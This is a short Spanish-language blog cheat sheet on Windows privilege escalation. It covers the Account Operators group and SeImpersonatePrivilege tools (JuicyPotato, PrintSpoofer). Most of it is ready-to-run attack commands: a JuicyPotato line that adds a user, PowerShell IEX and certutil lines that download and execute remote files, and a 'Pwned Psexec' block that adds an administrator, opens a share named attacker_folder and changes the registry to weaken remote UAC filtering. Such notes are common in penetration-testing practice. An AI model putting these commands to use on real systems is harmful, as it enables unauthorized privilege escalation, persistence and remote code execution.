---
layout: post
title: Windows Privesc
tags: [windows,CheetSheat]
description: "Windows Privesc"
---


## Grupos y permisos

### Accoutn operators

Otorga privilegios limitados de creación de cuentas a un usuario. Básicamente, esto puede crear y administrar usuarios y grupos en el dominio, incluida su propia membresía y la del grupo de Operadores de servidor.

[https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators)

### SeImpersonatePrivilege

- juicyPotato
- PrintSpoofer

```
JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user TEST TEST123 /add"
```

## Transferencia de archivos

```
powershell IEX(New-Object Net.WebClient).downloadString('<http://file>')
certutil.exe -f -urlcache -split <http://file>
IWR -uri <http://file> -OutFile <file>
```

## Pwned Psexec

```
cmd /c net user USERX PASSWORD /add
cmd /c net localgroup Administrators USERX /add
cmd /c net share attacker_folder=C:\Windows\Temp GRANT:Administrators,FULL
cmd /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountFilterPolicy /t REG_DWORD /d 1 /f
```